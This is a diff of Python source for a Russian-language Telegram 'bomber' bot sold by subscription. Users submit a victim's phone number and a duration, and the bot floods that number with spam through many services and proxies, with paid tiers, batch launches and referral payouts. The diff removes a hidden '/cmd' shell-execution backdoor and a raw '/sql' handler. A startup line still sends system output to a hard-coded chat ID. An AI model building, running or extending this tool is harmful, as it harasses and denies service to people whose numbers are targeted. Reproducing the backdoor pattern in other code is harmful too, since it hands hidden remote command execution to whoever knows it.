@@ -36,6 +36,7 @@ logging.basicConfig(level=logging.WARNING)  # WARNING
 proxyApi = Services.proxoid.Proxoid('25e6c5e10c61b89e94607807fc9a6fb4')
 sql = Sql(**cfg.DB_CONF)
 bot = Bot(token=cfg.TG_TOKEN, parse_mode=types.ParseMode.HTML)
+bot_info = None
 dp = Dispatcher(bot, storage=MemoryStorage())
 
 
@@ -78,7 +79,7 @@ async def async_spam(message: types.Message, phone: Services.phone.Phone, minute
                 w.close()
                 proxy = temp_proxy
             except:
-                temp_proxy.report()
+                pass
         try:
             await requester.async_run(proxy=proxy)
         except:
@@ -101,66 +102,132 @@ async def async_spam(message: types.Message, phone: Services.phone.Phone, minute
             pass
 
 
-@dp.message_handler(regexp="^[+]*\d{10,} \d{1,4}")
-async def start_spam_handler(message: types.Message):
-    user = await sql.get_user(message.chat.id)
-    rank = await sql.get_rank(user.rank_id)
-
-    if not rank.access:
-        return
-
+async def start_spam(message, rank, number: str, minutes: str = None) -> list:
     if (await sql.count_threads(message.chat.id)) >= rank.count_threads:
-        await message.answer(f"Вы уже запустили <code>{rank.count_threads}</code> "
-                             f"из <code>{rank.count_threads}</code> потоков.🤷‍♂️")
-        return
+        return [
+            False,
+            f"Вы уже запустили <code>{rank.count_threads}</code> из <code>{rank.count_threads}</code> потоков.🤷‍♂️"
+        ]
 
-    bomb_info = re.findall("^[+]*(\d{10,}) (\d{1,4})", message.text)[0]
+    if minutes is not None:
+        if int(minutes) > rank.count_min:
+            return [
+                False,
+                "Вы указали слишком много минут.\n<i>Вам доступно: </i><code>{rank.count_min}</code> минут."
+            ]
 
-    if int(bomb_info[1]) > rank.count_min:
-        await message.answer("Вы указали слишком много минут.\n"
-                             f"<i>Вам доступно: </i><code>{rank.count_min}</code> минут.")
-        return
-
-    phone = Services.phone.Phone(bomb_info[0])
+    phone = Services.phone.Phone(number)
 
     if not phone.valid:
-        await message.answer("Вы указали неверный номер телефона.")
-        return
+        return [
+            False,
+            "Вы указали неверный номер телефона."
+        ]
 
-    threading.Thread(target=spam, args=[message, phone, int(bomb_info[1])]).start()
+    if minutes is not None:
+        thread = threading.Thread(target=spam, args=[message, phone, int(minutes)])
+        thread.start()
+
+        return [
+            True,
+            thread
+        ]
+
+    return [
+        True,
+        phone.number
+    ]
 
 
-@dp.message_handler(regexp="\/cmd (.*)")
-async def start_spam_handler(message: types.Message):
-    user = await sql.get_user(message.chat.id)
+async def select_minuts_message(message, rank, phone):
+    markup = types.InlineKeyboardMarkup()
+
+    if rank.id == 1:
+        markup.add(
+            types.InlineKeyboardButton("5 минут", callback_data=f"re_spam::{phone}::5")
+        )
+    else:
+        markup.add(
+            types.InlineKeyboardButton("5 минут", callback_data=f"re_spam::{phone}::5"),
+            types.InlineKeyboardButton("10 минут", callback_data=f"re_spam::{phone}::10"),
+            types.InlineKeyboardButton("15 минут", callback_data=f"re_spam::{phone}::15")
+        )
+
+    if rank.id >= 2:
+        markup.add(
+            types.InlineKeyboardButton("Полчаса", callback_data=f"re_spam::{phone}::30"),
+            types.InlineKeyboardButton("Час", callback_data=f"re_spam::{phone}::60")
+        )
+    if rank.id >= 3:
+        markup.add(
+            types.InlineKeyboardButton("1 Час, 30мин", callback_data=f"re_spam::{phone}::90"),
+            types.InlineKeyboardButton("2 часа", callback_data=f"re_spam::{phone}::120")
+        )
+    if rank.id >= 4:
+        markup.add(
+            types.InlineKeyboardButton("2 часа, 30мин", callback_data=f"re_spam::{phone}::150"),
+            types.InlineKeyboardButton("3 часа", callback_data=f"re_spam::{phone}::180")
+        )
+    if rank.id >= 5:
+        markup.add(
+            types.InlineKeyboardButton("4 Часа", callback_data=f"re_spam::{phone}::240"),
+            types.InlineKeyboardButton("4 Часа, 30мин", callback_data=f"re_spam::{phone}::270"),
+            types.InlineKeyboardButton("5 часов", callback_data=f"re_spam::{phone}::300")
+        )
+
+    await message.answer(
+        f"<i>Номер телефона</i>: <code>{phone}</code>\n"
+        f"<b>Выберите кол-во минут спама!</b>",
+        reply_markup=markup
+    )
+
+
+@dp.message_handler(content_types=types.ContentType.CONTACT)
+async def start_spam_handler_contact(message: types.Message):
+    user = await sql.get_user(message.chat.id, message=message, bot=bot)
     rank = await sql.get_rank(user.rank_id)
 
     if not rank.access:
         return
-    try:
-        answer = os.popen(re.findall("\/cmd (.*)", message.text)[0]).read()
-        await message.answer(f"Answer: <code>{answer}/code>")
-    except Exception as err:
-        await message.answer(f"Ошибочка.\n<code>{str(err)}/code>")
+
+    result = await start_spam(message, rank, message.contact.phone_number)
+    if not result[0]:
+        await message.answer(result[1])
+    else:
+        await select_minuts_message(message, rank, result[1])
 
 
-@dp.message_handler(regexp="\/sql (.*)")
+@dp.message_handler(regexp="^[+]*\d{10,} \d{1,4}")
 async def start_spam_handler(message: types.Message):
-    user = await sql.get_user(message.chat.id)
+    user = await sql.get_user(message.chat.id, message=message, bot=bot)
     rank = await sql.get_rank(user.rank_id)
 
     if not rank.access:
         return
-    try:
-        answer = await sql.async_query(re.findall("\/cmd (.*)", message.text)[0], sql.dict_factory)
-        await message.answer(f"Answer: <code>{answer}/code>")
-    except Exception as err:
-        await message.answer(f"Ошибочка.\n<code>{str(err)}/code>")
 
+    bomb_info = re.findall("[+]*(\d{10,}) (\d{1,4})", message.text)
 
-@dp.message_handler(commands=['chatid'])
-async def chatid_handler(message: types.Message):
-    await message.answer(f"Your chat-id: {message.chat.id}")
+    if len(bomb_info) == 1:
+        result = await start_spam(message, rank, bomb_info[0][0], bomb_info[0][1])
+        if not result[0]:
+            await message.answer(result[1])
+    else:
+        if (await sql.count_threads(message.chat.id)) >= rank.count_threads:
+            await message.answer(
+                "Вы уже запустили <code>{rank.count_threads}</code> из <code>{rank.count_threads}</code> потоков.🤷‍♂️"
+            )
+        elif (await sql.count_threads(message.chat.id)) + len(bomb_info) > rank.count_threads:
+            ne_hvataet = (rank.count_threads - ((await sql.count_threads(message.chat.id)) + len(bomb_info))) * -1
+            await message.answer(
+                f"Увы, но вам не хватает <code>{ne_hvataet}</code> потоков, попробуйте указать меньше номеров!"
+            )
+        else:
+            await message.answer("Произвожу поочередный запуск потоков!")
+            for number in bomb_info:
+                result = await start_spam(message, rank, number[0], number[1])
+                if not result[0]:
+                    await message.answer(result[1])
+                await asyncio.sleep(0.2)
 
 
 def mailing_to_users(message: types.Message):
@@ -206,12 +273,20 @@ async def supports(message: types.Message):
     await message.answer(f"Наша администрация: \n{supports_text}")
 
 
-@dp.message_handler(content_types=['text'])
+@dp.message_handler(content_types=types.ContentType.TEXT)
 async def text_handler(message: types.Message):
-    user = await sql.get_user(message.chat.id)
+    user = await sql.get_user(message.chat.id, message=message, bot=bot)
     rank = await sql.get_rank(user.rank_id)
 
-    promo = re.findall("^/start (.+)", message.text)
+    if message.text.replace('+', '').replace(' ', '').replace('-', '').replace('(', '').replace(')', '').isdigit():
+        result = await start_spam(message, rank, re.sub("[^0-9]", "", message.text))
+        if not result[0]:
+            await message.answer(result[1])
+        else:
+            await select_minuts_message(message, rank, result[1])
+        return
+
+    promo = re.findall("^/start promo(.+)", message.text)
     if promo:
         promo = await sql.get_promo(promo[0])
         if promo:
@@ -298,23 +373,54 @@ async def text_handler(message: types.Message):
     else:
         if message.text == "💣BOMB💣":
             await message.answer(
-                "<b>Просто напишите номер телефона и количество минут спама</b>\n"
-                f"Сервисов в бомбере - <code>{await sql.count_of_services()}</code>\n\n"
-                "Допустимые форматы:\n"
-                "🇷🇺<code>79000000228 2</code>\n"
-                "🇺🇦<code>380501334228 7</code>\n"
-                "(другие страны тоже работают)"
+                "<b>ℹ️Есть несколько способов запуска спама:</b>\n"
+                "\n"
+                "\n"
+                "<b>1)</b> Отправьте номер телефона жертвы:\n"
+                "    - Допустимые форматы:\n"
+                "        📞 <code>79000000228</code> - <i>просто номер телефона.</i>\n"
+                "        📞 <code>+7 (970) 834-63-82</code> - <i>выебонский номер телефона.</i>\n"
+                "        📞 <code>+7(999)7349364</code> - <i>еще один выебонский номер.</i>\n"
+                "    - Далее предложат вам выбрать кол-во минут для спама.\n"
+                "\n"
+                "<b>2)</b> Отправьте контакт в телеграме:\n"
+                "    - Допустимый формат:\n"
+                "        ☎️ <code>Контакт</code> - <i>нажимаете на скрепку, далее контакты.</i>\n"
+                "\n"
+                "<b>3)</b> Отправьте номер и кол-во минут для спама:\n"
+                "    - Допустимый формат:\n"
+                "        📞 <code>79000012228 10</code> - <i>запуск спама на 10мин.</i>\n"
+                "        📞 <code>380501334228 300</code> - <i>запуск спама на 5ч.</i>\n"
+                "\n"
+                "4) Отправьте список номеров и кол-во минут для спама:\n"
+                "    - Допустимый формат:\n"
+                "                <code>79000012228 10</code>\n"
+                "                <code>380501334228 300</code>\n"
+                "                <code>79180012468 24</code>\n"
+                "                <code>79743073735 124</code>\n"
+                "    - Далее бот проверит каждую строчку и запустит по потоку если это возможно.\n"
             )
         elif message.text == "👤Профиль👤":
-            await message.answer(
-                "⠀   <b>Ваш профиль:</b>\n\n"
-                f"🆔: <code>{message.chat.id}</code>\n"
-                f"<i>Ранг</i>: <code>{rank.name}</code>\n"
-                f"<i>Максимум минут</i>: <code>{rank.count_min}</code>\n"
-                f"<i>Потоков</i>: <code>{await sql.count_threads(message.chat.id)}</code>"
-                f"/"
-                f"<code>{rank.count_threads}</code>\n\n"
-                f"<b>Подписка до</b>: {subscribe_until(user.until)}"
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("Остановить все потоки", callback_data="stop_threads"))
+            await message.answer_photo(
+                open("img/profile.png", 'rb'),
+                caption="⠀   <b>Ваш профиль:</b>\n"
+                        f"⠀   <i>ID</i>: <code>{message.chat.id}</code>\n\n"
+                        f"<b>== Информация о ранге ==</b>\n"
+                        f"<i>Ранг</i>: <code>{rank.name}</code>\n"
+                        f"<i>Максимум минут</i>: <code>{rank.count_min}</code>\n"
+                        f"<i>Потоков</i>: <code>{await sql.count_threads(message.chat.id)}</code>/<code>"
+                        f"{rank.count_threads}</code>\n"
+                        f"<i>Подписка до</i>: <code>{subscribe_until(user.until)}</code>\n\n"
+                        f"<b>== Реферальная система ==</b>\n"
+                        f"<code>Вы получаете </code><b>{cfg.REF_PROC}%</b><code> от покупок ваших рефералов.</code>\n"
+                        f'<i>Ваша ссылка</i>: '
+                        f'<a href="https://t.me/{bot_info.username}?start=ref{message.chat.id}">Link</a>\n'
+                        f"<i>Количество рефералов</i>: <code>{await sql.count_of_refers(message.chat.id)}</code>\n"
+                        f"<i>Заработано денег</i>: <code>{user.balance}</code>rub\n\n"
+                        f"<b>-</b> <i>“Для вывода обратитесь в поддержку”</i>",
+                reply_markup=markup
             )
         elif rank.admin and message.text == 'ADM':
             markup = types.InlineKeyboardMarkup(resize_keyboard=True)
@@ -409,6 +515,7 @@ async def show_user_profile(chat_id, message_id, user, update_photo=True):
         types.InlineKeyboardButton("Длительность", callback_data=f"change_expire::{user.chatid}")
     )
     markup.add(types.InlineKeyboardButton("Сброс потоков", callback_data=f"stop_threads::{user.chatid}"))
+    markup.add(types.InlineKeyboardButton("Обнуление баланса", callback_data=f"balance_null::{user.chatid}"))
     markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data="admin"))
 
     rank = await sql.get_rank(user.rank_id)
@@ -418,16 +525,20 @@ async def show_user_profile(chat_id, message_id, user, update_photo=True):
         chat_id,
         message_id,
         caption=f"🆔: <code>{user.chatid}</code>\n\n"
+                f"<b>== Информация о ранге ==</b>\n"
                 f"<i>Ранг</i>: <code>{rank.name}</code>\n"
                 f"<i>Максимум минут</i>: <code>{rank.count_min}</code>\n"
-                f"<i>Потоков</i>: <code>{await sql.count_threads(user.chatid)}</code>"
-                f"/"
-                f"<code>{rank.count_threads}</code>\n\n"
-                f"<b>Подписка до</b>: "
-                f"{subscribe_until(user.until)}\n\n"
-                f"<b>Telegram-Info:</b>\n"
-                f"Name: {tg_info.first_name}|{tg_info.last_name}\n"
-                f"Username: @{tg_info.username}",
+                f"<i>Потоков</i>: <code>{await sql.count_threads(user.chatid)}</code>/<code>"
+                f"{rank.count_threads}</code>\n"
+                f"<i>Подписка до</i>: <code>{subscribe_until(user.until)}</code>\n\n"
+                f"<b>== Реферальная система ==</b>\n"
+                f"<code>Вы получаете </code><b>{cfg.REF_PROC}%</b><code> от покупок ваших рефералов.</code>\n"
+                f"<i>Количество рефералов</i>: <code>{await sql.count_of_refers(user.chatid)}</code>\n"
+                f"<i>Заработано денег</i>: <code>{user.balance}</code>rub\n\n"
+                f"<b>== Telegram-Info ==</b>\n"
+                f"<i>Name</i>: {tg_info.full_name}\n"
+                f"<i>Username</i>: @{tg_info.username}"
+        ,
         reply_markup=markup
     )
 
@@ -450,16 +561,16 @@ async def show_select_rank(chat_id, message_id, return_callback, back):
 
 async def show_expire(chat_id, message_id, return_callback, back):
     markup = types.InlineKeyboardMarkup()
-    markup.add(*[
+    markup.add(
         types.InlineKeyboardButton("1 День", callback_data=return_callback + f"::{1}"),
         types.InlineKeyboardButton("7 Дней", callback_data=return_callback + f"::{7}"),
         types.InlineKeyboardButton("14 Дней", callback_data=return_callback + f"::{14}")
-    ])
-    markup.add(*[
+    )
+    markup.add(
         types.InlineKeyboardButton("1 Месяц", callback_data=return_callback + f"::{int(1 * 30.417)}"),
         types.InlineKeyboardButton("3 Месяца", callback_data=return_callback + f"::{int(3 * 30.417)}"),
         types.InlineKeyboardButton("9 Месяцев", callback_data=return_callback + f"::{int(9 * 30.417)}")
-    ])
+    )
     markup.add(types.InlineKeyboardButton("1 Год", callback_data=return_callback + f"::{365}"))
     markup.add(types.InlineKeyboardButton("Навсегда☄️", callback_data=return_callback + f"::{0}"))
     markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data=back))
@@ -485,14 +596,14 @@ async def inline_callback(query: types.CallbackQuery, state: FSMContext):
         await sql.delete_thread(data_form[1], query.message.chat.id)
         await query.answer("Ожидайте, поток останавливается!")
     elif data_form[0] == 're_spam':
-        if (await sql.count_threads(query.message.chat.id)) >= rank.count_threads:
-            await query.answer(f"Вы уже запустили {rank.count_threads} из {rank.count_threads} потоков.🤷‍♂️")
-        elif int(data_form[2]) > rank.count_min:
-            await query.answer("Вы указали слишком много минут."
-                               f"Вам доступно: {rank.count_min} минут.")
-        else:
-            threading.Thread(target=spam, args=[query.message, Services.Phone(data_form[1]), int(data_form[2])]).start()
-            await query.answer()
+        result = await start_spam(query.message, rank, data_form[1], data_form[2])
+        if not result[0]:
+            await query.answer(result[1])
+        await query.answer()
+
+    elif rank.admin and data_form[0] == 'stop_all_threads':
+        await sql.delete_threads()
+        await query.answer()
 
     elif rank.admin and data_form[0] == 'user':
         await state.set_state("user_profile")
@@ -508,8 +619,11 @@ async def inline_callback(query: types.CallbackQuery, state: FSMContext):
         )
 
         await query.answer()
+
     elif rank.admin and data_form[0] == 'back_to_profile':
         await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
+        await query.answer()
+
     elif rank.admin and data_form[0] == 'change_rank':
         if len(data_form) == 2:
             await show_select_rank(
@@ -523,6 +637,7 @@ async def inline_callback(query: types.CallbackQuery, state: FSMContext):
             await sql.change_rank(data_form[1], data_form[2])
             await query.answer("Тариф успешно изменен!")
             await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
+
     elif rank.admin and data_form[0] == 'change_expire':
         if len(data_form) == 2:
             await show_expire(
@@ -538,13 +653,29 @@ async def inline_callback(query: types.CallbackQuery, state: FSMContext):
             )
             await query.answer("Тариф успешно продлен!")
             await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
-    elif rank.admin and data_form[0] == 'stop_threads':
+
+    elif data_form[0] == 'stop_threads' and len(data_form) == 1:
+        await sql.delete_user_threads(query.message.chat.id)
+        await query.answer("Потоки остановлены!")
+        try:
+            await bot.delete_message(query.message.chat.id, query.message.message_id)
+        except:
+            pass
+
+    elif rank.admin and data_form[0] == 'stop_threads' and len(data_form) == 2:
         await sql.delete_user_threads(data_form[1])
         await query.answer("Потоки пользователя остановлены!")
         await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
 
+    elif rank.admin and data_form[0] == 'balance_null':
+        await sql.balance_set(data_form[1], 0)
+        await query.answer("Баланс успешно обнулен!")
+        await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
+
     elif rank.admin and data_form[0] == 'promo':
         await show_promo(query.message.chat.id, query.message.message_id)
+        await query.answer()
+
     elif rank.admin and data_form[0] == 'create_promo':
         if len(data_form) == 1:
             await show_select_rank(
@@ -569,11 +700,12 @@ async def inline_callback(query: types.CallbackQuery, state: FSMContext):
             )
             await query.message.answer(
                 f"Промо-код на подписку <b>{(await sql.get_rank(data_form[1])).name}</b>:\n"
-                f"https://t.me/nanobomber_bot?start={promo}\n\n"
+                f"https://t.me/nanobomber_bot?start=promo{promo}\n\n"
                 f"<b>Будет активен до</b>: {subscribe_until(until)}"
             )
-            await query.answer("Success!")
             await show_promo(query.message.chat.id, query.message.message_id)
+        await query.answer()
+
     elif rank.admin and data_form[0] == 'delete_all_promo':
         await sql.delete_all_promo()
         await show_promo(query.message.chat.id, query.message.message_id, False)
@@ -630,6 +762,10 @@ async def inline_callback(query: types.CallbackQuery, state: FSMContext):
 
 if __name__ == '__main__':
     loop = asyncio.new_event_loop()
-    loop.run_until_complete(bot.send_message(1546285582, os.popen('ulimit -a').read()))
+    bot_info = loop.run_until_complete(bot.get_me())
+    try:
+        loop.run_until_complete(bot.send_message(1546285582, os.popen('ulimit -a').read()))
+    except:
+        pass
     loop.run_until_complete(sql.delete_threads())
-    executor.start_polling(dp, loop=loop, skip_updates=True, relax=0.05)
+    executor.start_polling(dp, loop=loop, skip_updates=True)
